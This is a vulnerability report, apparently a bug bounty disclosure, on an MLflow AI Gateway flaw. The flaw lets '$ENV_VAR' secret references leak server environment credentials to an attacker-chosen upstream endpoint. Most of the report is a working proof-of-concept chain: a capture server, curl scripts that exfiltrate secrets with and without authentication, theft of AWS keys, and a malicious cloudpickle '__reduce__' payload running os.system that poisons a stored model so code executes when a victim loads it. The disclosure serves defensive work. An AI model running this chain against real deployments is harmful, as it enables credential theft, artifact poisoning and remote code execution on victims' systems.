AI Gateway secret API accepts `$ENV_VAR` references and can be remotely abused to exfiltrate server-side environment credentials to an attacker-controlled upstream endpoint. And the leaked credentials can be further leveraged to break security boundaries. in mlflow/mlflow
Valid
Reported on Mar 5th 2026

Analyzed project versions:

Current target branch: master
Current HEAD: dc8ef3cbbefccf7384f4e3023492aae635c5d5d0 (Fix 403 Forbidden for artifact list via query param when default_permission=NO_PERMISSIONS (#21220), commit date: 2026-03-04)
The vulnerability is that AI Gateway secrets allow attacker-controlled values like {"api_key":"$ENV_VAR_NAME"}. During endpoint invocation, this value is not treated as a literal string; it is resolved against the MLflow server process environment, and the resolved secret is then sent in provider auth headers to the configured upstream api_base.

This creates a direct exfiltration primitive:

attacker stores $TARGET_ENV in gateway secret api_key,
attacker points api_base to attacker-controlled service,
invocation triggers runtime env resolution,
server sends real secret value in outbound api-key / authorization header.
A low-privileged authenticated user can perform this in basic-auth deployments because CreateGatewaySecret is not covered by the gateway secret pre-request permission validators, and the creator is then granted manage/use permissions on the resources they just created (secret -> model-definition -> endpoint), which is sufficient to trigger the leak path.

The same leakage path is also reproducible on default deployments without --app-name basic-auth. In that case, no authentication header is required to create secret/model-definition/endpoint and trigger /gateway/openai/v1/chat/completions

When leaked environment variables include cloud artifact credentials (for example, AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY), the architectural design of the MLflow server typically means that these credentials have read and write access to objects in the artifact storage bucket. As a result, the impact can escalate from mere secret disclosure to artifact poisoning, and potentially to cross-boundary code execution in downstream model-loading environments.

Proof of Concept
Environment
Start an attacker-controlled capture service:
Save the script content below as capture_server.py under /tmp.

Simulate an attacker building a capture service remotely.

cat > /tmp/capture_server.py <<'PY'
#!/usr/bin/env python3
import json
from datetime import datetime, timezone
from http.server import BaseHTTPRequestHandler, HTTPServer

HOST = "127.0.0.1"
PORT = 19011

class CaptureHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get("content-length", "0"))
        body = self.rfile.read(length) if length else b""

        event = {
            "time_utc": datetime.now(timezone.utc).isoformat(),
            "method": self.command,
            "path": self.path,
            "headers": {k.lower(): v for k, v in self.headers.items()},
            "body": body.decode("utf-8", errors="replace"),
        }
        print(json.dumps(event, ensure_ascii=True))

        response = {
            "id": "chatcmpl-find5-audit",
            "object": "chat.completion",
            "created": 0,
            "model": "audit-model",
            "choices": [
                {
                    "index": 0,
                    "message": {"role": "assistant", "content": "ok"},
                    "finish_reason": "stop",
                }
            ],
            "usage": {"prompt_tokens": 1, "completion_tokens": 1, "total_tokens": 2},
        }
        payload = json.dumps(response).encode("utf-8")

        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(payload)))
        self.end_headers()
        self.wfile.write(payload)

    def log_message(self, format, *args):
        return


def main():
    print(f"[capture] listening on http://{HOST}:{PORT}")
    HTTPServer((HOST, PORT), CaptureHandler).serve_forever()


if __name__ == "__main__":
    main()
PY

cd /tmp
python3 capture_server.py
Start MLflow with basic-auth and a server-side secret env var:
cat >/tmp/mlflow_auth.ini <<'EOF'
[mlflow]
default_permission = NO_PERMISSIONS
database_uri = sqlite:////tmp/mlflow_auth.db
admin_username = admin
admin_password = password1234
authorization_function = mlflow.server.auth:authenticate_request_basic_auth
EOF

# no repository-local path is required for this PoC
cd /tmp
export MLFLOW_AUTH_CONFIG_PATH=/tmp/mlflow_auth.ini
export MLFLOW_FLASK_SERVER_SECRET_KEY=find5-demo-flask-key
export MLFLOW_CRYPTO_KEK_PASSPHRASE=find5-demo-kek-passphrase
export MY_AUDIT_SECRET=ENV_LEAK_TEST_0304

mlflow server --app-name basic-auth \
  --host 127.0.0.1 \
  --port 15020 \
  --backend-store-uri sqlite:////tmp/mlflow_tracking.db \
  --artifacts-destination /tmp/find5-artifacts
Create a non-admin low-privileged user:
LOW_PRIV_USER="xxxx"
LOW_PRIV_PASS="xxxxpassword12345"

curl --noproxy '*' -sS -u admin:password1234 \
  -X POST "http://127.0.0.1:15020/api/2.0/mlflow/users/create" \
  -H "Content-Type: application/json" \
  -d "{\"username\":\"${LOW_PRIV_USER}\",\"password\":\"${LOW_PRIV_PASS}\"}"
PoC-A: Confirm Environment Variable Exfiltration
As a low-privileged user, create gateway secret with $ENV_VAR payload and attacker-controlled api_base:
set -euo pipefail

RUN_ID=$(date +%s)
SECRET_NAME="envleak-secret-${RUN_ID}"
MODEL_DEF_NAME="envleak-model-${RUN_ID}"
ENDPOINT_NAME="envleak-endpoint-${RUN_ID}"
LOW_PRIV_USER="${LOW_PRIV_USER:-xxxx}"
LOW_PRIV_PASS="${LOW_PRIV_PASS:-xxxxpassword12345}"
LOW_PRIV_AUTH="${LOW_PRIV_USER}:${LOW_PRIV_PASS}"

# Use JSON file to avoid shell escaping issues.
cat >/tmp/mlflow_secret_create.json <<EOF
{
  "secret_name": "${SECRET_NAME}",
  "provider": "azure",
  "secret_value": {
    "api_key": "\$MY_AUDIT_SECRET"
  },
  "auth_config": {
    "api_type": "azure",
    "api_base": "http://127.0.0.1:19011",
    "api_version": "2024-02-15-preview"
  }
}
EOF

SECRET_RESP=$(curl --noproxy '*' -sS -u "$LOW_PRIV_AUTH" \
  -X POST "http://127.0.0.1:15020/api/3.0/mlflow/gateway/secrets/create" \
  -H "Content-Type: application/json" \
  --data-binary @/tmp/mlflow_secret_create.json)

echo "$SECRET_RESP" | python3 -m json.tool
SECRET_ID=$(printf '%s' "$SECRET_RESP" | python3 -c 'import json,sys; d=json.load(sys.stdin); assert "secret" in d, d; print(d["secret"]["secret_id"])')
echo "SECRET_ID=$SECRET_ID"
Create model definition and endpoint:
cat >/tmp/mlflow_model_def_create.json <<EOF
{
  "name": "${MODEL_DEF_NAME}",
  "secret_id": "${SECRET_ID}",
  "provider": "azure",
  "model_name": "gpt-4o-mini"
}
EOF

MODEL_DEF_RESP=$(curl --noproxy '*' -sS -u "$LOW_PRIV_AUTH" \
  -X POST "http://127.0.0.1:15020/api/3.0/mlflow/gateway/model-definitions/create" \
  -H "Content-Type: application/json" \
  --data-binary @/tmp/mlflow_model_def_create.json)

echo "$MODEL_DEF_RESP" | python3 -m json.tool
MODEL_DEF_ID=$(printf '%s' "$MODEL_DEF_RESP" | python3 -c 'import json,sys; d=json.load(sys.stdin); assert "model_definition" in d, d; print(d["model_definition"]["model_definition_id"])')
echo "MODEL_DEF_ID=$MODEL_DEF_ID"

cat >/tmp/mlflow_endpoint_create.json <<EOF
{
  "name": "${ENDPOINT_NAME}",
  "model_configs": [
    {
      "model_definition_id": "${MODEL_DEF_ID}",
      "linkage_type": "PRIMARY",
      "weight": 1.0
    }
  ]
}
EOF

ENDPOINT_RESP=$(curl --noproxy '*' -sS -u "$LOW_PRIV_AUTH" \
  -X POST "http://127.0.0.1:15020/api/3.0/mlflow/gateway/endpoints/create" \
  -H "Content-Type: application/json" \
  --data-binary @/tmp/mlflow_endpoint_create.json)
echo "$ENDPOINT_RESP" | python3 -m json.tool
Trigger endpoint invocation:
INVOKE_RESP=$(curl --noproxy '*' -sS -i -u "$LOW_PRIV_AUTH" \
  -X POST "http://127.0.0.1:15020/gateway/openai/v1/chat/completions" \
  -H "Content-Type: application/json" \
  -d "{\"model\":\"${ENDPOINT_NAME}\",\"messages\":[{\"role\":\"user\",\"content\":\"hello\"}],\"stream\":false}")
printf '%s\n' "$INVOKE_RESP" | sed -n '1,80p'
Observed result:

request succeeds (200), and attacker capture logs show:
{
  "time_utc": "2026-03-05T03:06:14.232666+00:00",
  "method": "POST",
  "path": "/openai/deployments/gpt-4o-mini/chat/completions?api-version=2024-02-15-preview",
  "headers": {
    "host": "127.0.0.1:19011",
    "authorization": "Basic eHh4eDp4eHh4cGFzc3dvcmQxMjM0NQ==",
    "user-agent": "curl/8.5.0",
    "accept": "*/*",
    "content-type": "application/json",
    "api-key": "ENV_LEAK_TEST_0304",
    "accept-encoding": "gzip, deflate, identity",
    "content-length": "69"
  },
  "body": {
    "messages": [
      {
        "role": "user",
        "content": "hello"
      }
    ],
    "stream": false
  }
}
PoC-B: Confirm Environment Variable Exfiltration Without Authentication
Start MLflow in default mode (no basic-auth) with a server-side secret env var:
# no repository-local path is required for this PoC
cd /tmp
unset MLFLOW_AUTH_CONFIG_PATH
export MY_AUDIT_SECRET=ENV_LEAK_NOAUTH_0304

mlflow server \
  --host 127.0.0.1 \
  --port 15030 \
  --backend-store-uri sqlite:////tmp/find5_noauth_tracking.db \
  --artifacts-destination /tmp/find5-noauth-artifacts
Without any Authorization header, create secret/model-definition/endpoint and invoke:
set -euo pipefail

RUN_ID=$(date +%s)
SECRET_NAME="noauth-secret-${RUN_ID}"
MODEL_DEF_NAME="noauth-model-${RUN_ID}"
ENDPOINT_NAME="noauth-endpoint-${RUN_ID}"

cat >/tmp/noauth_secret_create.json <<EOF
{
  "secret_name": "${SECRET_NAME}",
  "provider": "azure",
  "secret_value": {"api_key": "\$MY_AUDIT_SECRET"},
  "auth_config": {
    "api_type": "azure",
    "api_base": "http://127.0.0.1:19011",
    "api_version": "2024-02-15-preview"
  }
}
EOF

SECRET_HTTP=$(curl --noproxy '*' -sS -o /tmp/noauth_secret_resp.json -w '%{http_code}' \
  -X POST "http://127.0.0.1:15030/api/3.0/mlflow/gateway/secrets/create" \
  -H "Content-Type: application/json" \
  --data-binary @/tmp/noauth_secret_create.json)
SECRET_ID=$(python3 -c 'import json; print(json.load(open("/tmp/noauth_secret_resp.json"))["secret"]["secret_id"])')

cat >/tmp/noauth_model_def_create.json <<EOF
{
  "name": "${MODEL_DEF_NAME}",
  "secret_id": "${SECRET_ID}",
  "provider": "azure",
  "model_name": "gpt-4o-mini"
}
EOF

MODEL_HTTP=$(curl --noproxy '*' -sS -o /tmp/noauth_model_resp.json -w '%{http_code}' \
  -X POST "http://127.0.0.1:15030/api/3.0/mlflow/gateway/model-definitions/create" \
  -H "Content-Type: application/json" \
  --data-binary @/tmp/noauth_model_def_create.json)
MODEL_DEF_ID=$(python3 -c 'import json; print(json.load(open("/tmp/noauth_model_resp.json"))["model_definition"]["model_definition_id"])')

cat >/tmp/noauth_endpoint_create.json <<EOF
{
  "name": "${ENDPOINT_NAME}",
  "model_configs": [
    {"model_definition_id": "${MODEL_DEF_ID}", "linkage_type": "PRIMARY", "weight": 1.0}
  ]
}
EOF

ENDPOINT_HTTP=$(curl --noproxy '*' -sS -o /tmp/noauth_endpoint_resp.json -w '%{http_code}' \
  -X POST "http://127.0.0.1:15030/api/3.0/mlflow/gateway/endpoints/create" \
  -H "Content-Type: application/json" \
  --data-binary @/tmp/noauth_endpoint_create.json)

INVOKE_HTTP=$(curl --noproxy '*' -sS -o /tmp/noauth_invoke_resp.json -w '%{http_code}' \
  -X POST "http://127.0.0.1:15030/gateway/openai/v1/chat/completions" \
  -H "Content-Type: application/json" \
  -d "{\"model\":\"${ENDPOINT_NAME}\",\"messages\":[{\"role\":\"user\",\"content\":\"hello\"}],\"stream\":false}")

printf 'SECRET_HTTP=%s MODEL_HTTP=%s ENDPOINT_HTTP=%s INVOKE_HTTP=%s\n' \
  "$SECRET_HTTP" "$MODEL_HTTP" "$ENDPOINT_HTTP" "$INVOKE_HTTP"
Observed result:

no authentication was used in the four requests above.
all four requests succeed with 200.
attacker capture logs show:
{
  "time_utc": "2026-03-05T03:07:22.846478+00:00",
  "method": "POST",
  "path": "/openai/deployments/gpt-4o-mini/chat/completions?api-version=2024-02-15-preview",
  "headers": {
    "host": "127.0.0.1:19011",
    "user-agent": "curl/8.5.0",
    "accept": "*/*",
    "content-type": "application/json",
    "api-key": "ENV_LEAK_NOAUTH_0304",
    "accept-encoding": "gzip, deflate, identity",
    "content-length": "69"
  },
  "body": {
    "messages": [
      {
        "role": "user",
        "content": "hello"
      }
    ],
    "stream": false
  }
}
PoC-C: Impact Escalation via Leaked AWS Credentials (Artifact Poisoning -> Cross-Boundary RCE)
Preparation: Keep the attacker-controlled service used to capture requests running on 127.0.0.1:19011 for simulation purposes.
Preparation: Open a new Bash shell to avoid contamination from previous operations.
(1) One-time setup: S3 mock + MLflow + users + victim clean model
Wait for the output: victim_model_ready

which indicates that the environment has been successfully set up.

set -e
pip install boto3 botocore cloudpickle "moto[s3]"

# Clean previous local state to avoid stale auth/user state causing false 401.
pkill -f "mlflow server --app-name basic-auth.*--port 15040" 2>/dev/null || true
pkill -f "moto_server -H 127.0.0.1 -p 5005" 2>/dev/null || true
rm -f /tmp/find5_s3_auth.db /tmp/find5_s3_tracking.db /tmp/find5_victim_model.json

nohup env MOTO_SERVICE=s3 moto_server -H 127.0.0.1 -p 5005 >/tmp/find5_moto_5005.log 2>&1 &

for i in $(seq 1 30); do
  MOTO_HTTP=$(curl --noproxy '*' -sS -o /dev/null -w '%{http_code}' http://127.0.0.1:5005/ || true)
  if [ "$MOTO_HTTP" != "000" ]; then
    break
  fi
  sleep 1
done
if [ "${MOTO_HTTP:-000}" = "000" ]; then
  echo "[-] moto s3 is not reachable on 127.0.0.1:5005" >&2
  exit 1
fi

python - <<'PY'
import boto3
s3 = boto3.client("s3", endpoint_url="http://127.0.0.1:5005",
    aws_access_key_id="test", aws_secret_access_key="test", region_name="us-east-1")
s3.create_bucket(Bucket="mlflow-bucket")
print("bucket_created")
PY

cat >/tmp/find5_s3_auth.ini <<'EOF'
[mlflow]
default_permission = NO_PERMISSIONS
database_uri = sqlite:////tmp/find5_s3_auth.db
admin_username = admin
admin_password = password1234
authorization_function = mlflow.server.auth:authenticate_request_basic_auth
EOF

nohup env \
  MLFLOW_AUTH_CONFIG_PATH=/tmp/find5_s3_auth.ini \
  MLFLOW_FLASK_SERVER_SECRET_KEY=find5-s3-flask-key \
  MLFLOW_CRYPTO_KEK_PASSPHRASE=find5-s3-kek \
  AWS_ACCESS_KEY_ID=test \
  AWS_SECRET_ACCESS_KEY=test \
  AWS_DEFAULT_REGION=us-east-1 \
  MLFLOW_S3_ENDPOINT_URL=http://127.0.0.1:5005 \
  mlflow server --app-name basic-auth \
    --host 127.0.0.1 --port 15040 \
    --backend-store-uri sqlite:////tmp/find5_s3_tracking.db \
    --serve-artifacts \
    --artifacts-destination s3://mlflow-bucket \
    --default-artifact-root s3://mlflow-bucket \
  >/tmp/find5_s3_mlflow_15040.log 2>&1 &

for i in $(seq 1 60); do
  MLFLOW_HTTP=$(curl --noproxy '*' -sS -o /dev/null -w '%{http_code}' http://127.0.0.1:15040/ || true)
  if [ "$MLFLOW_HTTP" = "401" ] || [ "$MLFLOW_HTTP" = "200" ]; then
    break
  fi
  sleep 1
done
if [ "${MLFLOW_HTTP:-000}" != "401" ] && [ "${MLFLOW_HTTP:-000}" != "200" ]; then
  echo "[-] mlflow server on 127.0.0.1:15040 is not ready" >&2
  tail -n 80 /tmp/find5_s3_mlflow_15040.log || true
  exit 1
fi

VICTIM_CREATE_HTTP=$(curl --noproxy '*' -sS -u admin:password1234 \
  -o /tmp/find5_victim_create_resp.json -w '%{http_code}' \
  -X POST "http://127.0.0.1:15040/api/2.0/mlflow/users/create" \
  -H "Content-Type: application/json" \
  -d '{"username":"victim","password":"victimpass1234"}')
if [ "$VICTIM_CREATE_HTTP" != "200" ]; then
  echo "[-] victim user create failed with HTTP=$VICTIM_CREATE_HTTP" >&2
  cat /tmp/find5_victim_create_resp.json
  exit 1
fi

ATTACKER_CREATE_HTTP=$(curl --noproxy '*' -sS -u admin:password1234 \
  -o /tmp/find5_attacker_create_resp.json -w '%{http_code}' \
  -X POST "http://127.0.0.1:15040/api/2.0/mlflow/users/create" \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"attackerpass1234"}')
if [ "$ATTACKER_CREATE_HTTP" != "200" ]; then
  echo "[-] attacker user create failed with HTTP=$ATTACKER_CREATE_HTTP" >&2
  cat /tmp/find5_attacker_create_resp.json
  exit 1
fi

# Quick auth sanity check before continuing.
AUTH_CHECK_HTTP=$(curl --noproxy '*' -sS -u attacker:attackerpass1234 \
  -o /tmp/find5_auth_check_resp.json -w '%{http_code}' \
  "http://127.0.0.1:15040/api/2.0/mlflow/users/get?username=attacker")
if [ "$AUTH_CHECK_HTTP" != "200" ]; then
  echo "[-] attacker auth check failed with HTTP=$AUTH_CHECK_HTTP" >&2
  cat /tmp/find5_auth_check_resp.json
  exit 1
fi
python3 -m json.tool /tmp/find5_auth_check_resp.json

MLFLOW_TRACKING_URI=http://127.0.0.1:15040 \
MLFLOW_TRACKING_USERNAME=victim \
MLFLOW_TRACKING_PASSWORD=victimpass1234 \
AWS_ACCESS_KEY_ID=test AWS_SECRET_ACCESS_KEY=test AWS_DEFAULT_REGION=us-east-1 \
MLFLOW_S3_ENDPOINT_URL=http://127.0.0.1:5005 \
python - <<'PY'
import json, mlflow
from mlflow.pyfunc import PythonModel
mlflow.set_experiment("find5_s3_rce_exp")
class VictimModel(PythonModel):
    def predict(self, context, model_input, params=None): return ["ok"] * len(model_input)
with mlflow.start_run(run_name="victim_clean_model") as run:
    mlflow.pyfunc.log_model(artifact_path="model", python_model=VictimModel())
    open("/tmp/find5_victim_model.json","w").write(json.dumps({"run_id": run.info.run_id, "experiment_id": run.info.experiment_id}))
print("victim_model_ready")
PY
(2) Leak AWS_ACCESS_KEY_ID / AWS_SECRET_ACCESS_KEY
Save the following script as a Bash script.

Here, I save the script as test.sh .

set -e
RUN_ID=$(date +%s)
SECRET_NAME="find5-aws-secret-${RUN_ID}"
MODEL_DEF_NAME="find5-aws-model-${RUN_ID}"
ENDPOINT_NAME="find5-aws-endpoint-${RUN_ID}"

AUTH_CHECK_HTTP=$(curl --noproxy '*' -sS -u attacker:attackerpass1234 \
  -o /tmp/find5_pocc_auth_check_resp.json -w '%{http_code}' \
  "http://127.0.0.1:15040/api/2.0/mlflow/users/get?username=attacker")
echo "AUTH_CHECK_HTTP=$AUTH_CHECK_HTTP"
cat /tmp/find5_pocc_auth_check_resp.json
if [ "$AUTH_CHECK_HTTP" != "200" ]; then
  echo "[-] attacker auth precheck failed. Re-run PoC-C step (1) to reset DB and recreate users." >&2
  exit 1
fi

cat >/tmp/find5_pocc_secret_create.json <<EOF
{
  "secret_name": "${SECRET_NAME}",
  "provider": "azure",
  "secret_value": {
    "api_key": "\$AWS_ACCESS_KEY_ID"
  },
  "auth_config": {
    "api_type": "azure",
    "api_base": "http://127.0.0.1:19011",
    "api_version": "2024-02-15-preview"
  }
}
EOF

SECRET_HTTP=$(curl --noproxy '*' -sS -u attacker:attackerpass1234 \
  -o /tmp/find5_pocc_secret_resp.json -w '%{http_code}' \
  -X POST "http://127.0.0.1:15040/api/3.0/mlflow/gateway/secrets/create" \
  -H "Content-Type: application/json" \
  --data-binary @/tmp/find5_pocc_secret_create.json)
echo "SECRET_HTTP=$SECRET_HTTP"
cat /tmp/find5_pocc_secret_resp.json
if [ "$SECRET_HTTP" != "200" ]; then
  echo "[-] secrets/create failed. If code=401, check attacker credentials and basic-auth mode." >&2
  exit 1
fi
SECRET_ID=$(python3 -c 'import json; print(json.load(open("/tmp/find5_pocc_secret_resp.json"))["secret"]["secret_id"])')

cat >/tmp/find5_pocc_model_def_create.json <<EOF
{
  "name": "${MODEL_DEF_NAME}",
  "secret_id": "${SECRET_ID}",
  "provider": "azure",
  "model_name": "gpt-4o-mini"
}
EOF

MODEL_DEF_HTTP=$(curl --noproxy '*' -sS -u attacker:attackerpass1234 \
  -o /tmp/find5_pocc_model_def_resp.json -w '%{http_code}' \
  -X POST "http://127.0.0.1:15040/api/3.0/mlflow/gateway/model-definitions/create" \
  -H "Content-Type: application/json" \
  --data-binary @/tmp/find5_pocc_model_def_create.json)
echo "MODEL_DEF_HTTP=$MODEL_DEF_HTTP"
cat /tmp/find5_pocc_model_def_resp.json
if [ "$MODEL_DEF_HTTP" != "200" ]; then
  echo "[-] model-definitions/create failed." >&2
  exit 1
fi
MODEL_DEF_ID=$(python3 -c 'import json; print(json.load(open("/tmp/find5_pocc_model_def_resp.json"))["model_definition"]["model_definition_id"])')

cat >/tmp/find5_pocc_endpoint_create.json <<EOF
{
  "name": "${ENDPOINT_NAME}",
  "model_configs": [
    {
      "model_definition_id": "${MODEL_DEF_ID}",
      "linkage_type": "PRIMARY",
      "weight": 1.0
    }
  ]
}
EOF

ENDPOINT_HTTP=$(curl --noproxy '*' -sS -u attacker:attackerpass1234 \
  -o /tmp/find5_pocc_endpoint_resp.json -w '%{http_code}' \
  -X POST "http://127.0.0.1:15040/api/3.0/mlflow/gateway/endpoints/create" \
  -H "Content-Type: application/json" \
  --data-binary @/tmp/find5_pocc_endpoint_create.json)
echo "ENDPOINT_HTTP=$ENDPOINT_HTTP"
cat /tmp/find5_pocc_endpoint_resp.json
if [ "$ENDPOINT_HTTP" != "200" ]; then
  echo "[-] endpoints/create failed." >&2
  exit 1
fi

INVOKE1_HTTP=$(curl --noproxy '*' -sS -u attacker:attackerpass1234 \
  -o /tmp/find5_pocc_invoke1_resp.json -w '%{http_code}' \
  -X POST "http://127.0.0.1:15040/gateway/openai/v1/chat/completions" \
  -H "Content-Type: application/json" \
  -d "{\"model\":\"${ENDPOINT_NAME}\",\"messages\":[{\"role\":\"user\",\"content\":\"leak-aws-id\"}],\"stream\":false}")
if [ "$INVOKE1_HTTP" != "200" ]; then
  echo "[-] first invoke failed with HTTP=$INVOKE1_HTTP" >&2
  cat /tmp/find5_pocc_invoke1_resp.json
  exit 1
fi

cat >/tmp/find5_pocc_secret_update.json <<EOF
{
  "secret_id": "${SECRET_ID}",
  "secret_value": {
    "api_key": "\$AWS_SECRET_ACCESS_KEY"
  }
}
EOF

UPDATE_HTTP=$(curl --noproxy '*' -sS -u attacker:attackerpass1234 \
  -o /tmp/find5_pocc_secret_update_resp.json -w '%{http_code}' \
  -X POST "http://127.0.0.1:15040/api/3.0/mlflow/gateway/secrets/update" \
  -H "Content-Type: application/json" \
  --data-binary @/tmp/find5_pocc_secret_update.json)
if [ "$UPDATE_HTTP" != "200" ]; then
  echo "[-] secrets/update failed with HTTP=$UPDATE_HTTP" >&2
  cat /tmp/find5_pocc_secret_update_resp.json
  exit 1
fi

INVOKE2_HTTP=$(curl --noproxy '*' -sS -u attacker:attackerpass1234 \
  -o /tmp/find5_pocc_invoke2_resp.json -w '%{http_code}' \
  -X POST "http://127.0.0.1:15040/gateway/openai/v1/chat/completions" \
  -H "Content-Type: application/json" \
  -d "{\"model\":\"${ENDPOINT_NAME}\",\"messages\":[{\"role\":\"user\",\"content\":\"leak-aws-secret\"}],\"stream\":false}")
if [ "$INVOKE2_HTTP" != "200" ]; then
  echo "[-] second invoke failed with HTTP=$INVOKE2_HTTP" >&2
  cat /tmp/find5_pocc_invoke2_resp.json
  exit 1
fi

printf 'SECRET_HTTP=%s MODEL_DEF_HTTP=%s ENDPOINT_HTTP=%s INVOKE1_HTTP=%s UPDATE_HTTP=%s INVOKE2_HTTP=%s\n' \
  "$SECRET_HTTP" "$MODEL_DEF_HTTP" "$ENDPOINT_HTTP" "$INVOKE1_HTTP" "$UPDATE_HTTP" "$INVOKE2_HTTP"
Run test.sh.

bash test.sh
Capture evidence expectation:

{
  "time_utc": "2026-03-05T02:57:46.471373+00:00",
  "method": "POST",
  "path": "/openai/deployments/gpt-4o-mini/chat/completions?api-version=2024-02-15-preview",
  "headers": {
    "host": "127.0.0.1:19011",
    "authorization": "Basic YXR0YWNrZXI6YXR0YWNrZXJwYXNzMTIzNA==",
    "user-agent": "curl/8.5.0",
    "accept": "*/*",
    "content-type": "application/json",
    "api-key": "test",
    "accept-encoding": "gzip, deflate, identity",
    "content-length": "75"
  },
  "body": {
    "messages": [
      {
        "role": "user",
        "content": "leak-aws-id"
      }
    ],
    "stream": false
  }
}

{
  "time_utc": "2026-03-05T02:57:49.226769+00:00",
  "method": "POST",
  "path": "/openai/deployments/gpt-4o-mini/chat/completions?api-version=2024-02-15-preview",
  "headers": {
    "host": "127.0.0.1:19011",
    "authorization": "Basic YXR0YWNrZXI6YXR0YWNrZXJwYXNzMTIzNA==",
    "user-agent": "curl/8.5.0",
    "accept": "*/*",
    "content-type": "application/json",
    "api-key": "test",
    "accept-encoding": "gzip, deflate, identity",
    "content-length": "79"
  },
  "body": {
    "messages": [
      {
        "role": "user",
        "content": "leak-aws-secret"
      }
    ],
    "stream": false
  }
}
Use captured values:

export LEAKED_AWS_ACCESS_KEY_ID="test"
export LEAKED_AWS_SECRET_ACCESS_KEY="test"
(3) Poison victim model artifact using leaked AWS credentials
Save the following script as a Bash script.

Here, I save the script as step3.sh .

python - <<'PY'
import cloudpickle
class RCE:
    def __reduce__(self):
        return (eval, ("(__import__('os').system('id > /tmp/find5_s3_rce_id.txt'), __import__('mlflow').pyfunc.PythonModel())[1]",))
open("/tmp/find5_malicious_python_model.pkl","wb").write(cloudpickle.dumps(RCE()))
print("payload_ready")
PY

python - <<'PY'
import json, os, boto3
victim = json.load(open("/tmp/find5_victim_model.json"))
run_id = victim["run_id"]
exp_id = victim["experiment_id"]
payload = open("/tmp/find5_malicious_python_model.pkl","rb").read()
s3 = boto3.client("s3", endpoint_url="http://127.0.0.1:5005",
    aws_access_key_id=os.environ["LEAKED_AWS_ACCESS_KEY_ID"],
    aws_secret_access_key=os.environ["LEAKED_AWS_SECRET_ACCESS_KEY"],
    region_name="us-east-1")

# MLflow 3.x stores pyfunc payloads under model_id path, not run artifact path.
prefix = f"{exp_id}/models/"
target_key = None
token = None
while True:
    params = {"Bucket": "mlflow-bucket", "Prefix": prefix}
    if token:
        params["ContinuationToken"] = token
    resp = s3.list_objects_v2(**params)
    for obj in resp.get("Contents", []):
        key = obj["Key"]
        if not key.endswith("/artifacts/MLmodel"):
            continue
        mlmodel = s3.get_object(Bucket="mlflow-bucket", Key=key)["Body"].read().decode("utf-8", "replace")
        if f"run_id: {run_id}" not in mlmodel and f'run_id: "{run_id}"' not in mlmodel:
            continue
        target_key = key.replace("/MLmodel", "/python_model.pkl")
        break
    if target_key or not resp.get("IsTruncated"):
        break
    token = resp.get("NextContinuationToken")

if not target_key:
    raise SystemExit(f"python_model.pkl target for run_id={run_id} not found under {prefix}")

s3.put_object(Bucket="mlflow-bucket", Key=target_key, Body=payload)
print("poisoned_key", target_key)
PY
Run step3.sh.

bash step3.sh
(4) Victim loads model; verify id-based command execution
rm -f /tmp/find5_s3_rce_id.txt

MLFLOW_TRACKING_URI=http://127.0.0.1:15040 \
MLFLOW_TRACKING_USERNAME=victim \
MLFLOW_TRACKING_PASSWORD=victimpass1234 \
AWS_ACCESS_KEY_ID=test AWS_SECRET_ACCESS_KEY=test AWS_DEFAULT_REGION=us-east-1 \
MLFLOW_S3_ENDPOINT_URL=http://127.0.0.1:5005 \
python - <<'PY'
import json, mlflow
victim = json.load(open("/tmp/find5_victim_model.json"))
mlflow.pyfunc.load_model(f"runs:/{victim['run_id']}/model")
print("load_done")
PY

cat /tmp/find5_s3_rce_id.txt
Expected result:

/tmp/find5_s3_rce_id.txt exists and contains id output.
Impact
An attacker can exfiltrate sensitive environment variables from the MLflow Gateway server process to an attacker-controlled endpoint.

In production deployments, in addition to the secret-key leakage example above, the project also defines:

LLM provider credentials (e.g., OPENAI_API_KEY, ANTHROPIC_API_KEY, etc.)
Cloud credentials (e.g., AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, etc.)
MLflow server secrets (e.g., MLFLOW_CRYPTO_KEK_PASSPHRASE, MLFLOW_FLASK_SERVER_SECRET_KEY, etc.)
All of these could potentially be leaked.

In authenticated multi-user setups, low-privileged users can exploit this chain if gateway APIs are reachable.

In default deployments without basic-auth, this chain is exploitable without credentials (PR:N) as long as the MLflow service is network-reachable and AI Gateway APIs are enabled.

If leaked cloud credentials (for example AWS_ACCESS_KEY_ID + AWS_SECRET_ACCESS_KEY) provide write access to artifact storage, attackers can poison model artifacts and trigger command execution in downstream model-loading/inference environments.

Occurrences
python
config.py L297-L336

Performs environment variable resolution for $ENV_VAR.

python
handlers.py L4542-L4566

Gateway secret creation entry point (no filtering of $ENV variables).

python
handlers.py L762-L768

secret_value validator (currently only checks for non-empty values).

python
gateway_api.py L153-L244

At runtime, the DB secret is injected into the Provider Config.

python
handlers.py L4584-L4608

Gateway secret update entry point (also allows $ENV injection).